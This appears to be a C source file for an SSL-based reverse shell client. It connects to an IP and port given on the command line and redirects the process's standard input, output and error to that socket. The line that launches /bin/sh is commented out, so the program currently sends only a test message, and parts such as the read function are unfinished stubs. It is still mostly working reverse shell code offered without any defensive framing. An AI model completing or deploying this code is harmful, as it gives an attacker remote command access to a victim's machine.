#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>

// SSL Stuff
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define SHELL "/bin/sh"

typedef struct {
    int socket;
    SSL *sslHandle;
    SSL_CTX *sslContext;
} connection;

int tcp_connect(char host[], int port) {
    int sockfd = 0;
    char recvBuff[1024];
    struct sockaddr_in serv_addr;

    memset(recvBuff, '0', sizeof(recvBuff));
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return 1;
    }

    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
        return 1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("COULDN'T MAKE A CONNECTION!\n");
        return 1;
    }
    return sockfd;
}

connection *ssl_connect(char host[], int port) {
    connection *c;

    c = malloc(sizeof(connection));
    c->sslHandle = NULL;
    c->sslContext = NULL;

    c->socket = tcp_connect(host, port);
    if (c->socket) {
        SSL_load_error_strings();
        SSL_library_init();

        c->sslContext = SSL_CTX_new(SSLv23_client_method());
        if (c->sslContext == NULL) {
            return NULL;
        }

        c->sslHandle = SSL_new(c->sslContext);
        if (c->sslHandle == NULL) {
            return NULL;
        }

        if (!SSL_set_fd(c->sslHandle, c->socket)) {
            return NULL;
        }

        if (SSL_connect(c->sslHandle) != 1) {
            return NULL;
        }
    } else {
        printf("SSL CONNECT MESSED UP");
        return NULL;
    }
    return c;
}

void ssl_disconnect(connection *c) {
    if (c->socket) {
        close(c->socket);
    }
    if (c->sslHandle) {
        SSL_shutdown(c->sslHandle);
        SSL_free(c->sslHandle);
    }
    if (c->sslContext) {
        SSL_CTX_free(c->sslContext);
    }
    free(c);
}

char *ssl_read(connection *c) {
    char *rc = NULL;
    // Do I really need to implement this??
    return rc;
}

void ssl_write(connection *c, char *text) {
    if (c) {
        SSL_write(c->sslHandle, text, strlen(text));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("\nUsage: %s <ip of server> <port>\n", argv[0]);
        return 1;
    }

    connection *c;
    c = ssl_connect(argv[1], strtol(argv[2], NULL, 10)); 

    dup2(c->socket, 0);
    dup2(c->socket, 1);
    dup2(c->socket, 2);

    // Here's where the magic happens
    //execl(SHELL, SHELL, (char *)0);
    
    ssl_write(c, "Well piss, this is working!");

    return 0;
}
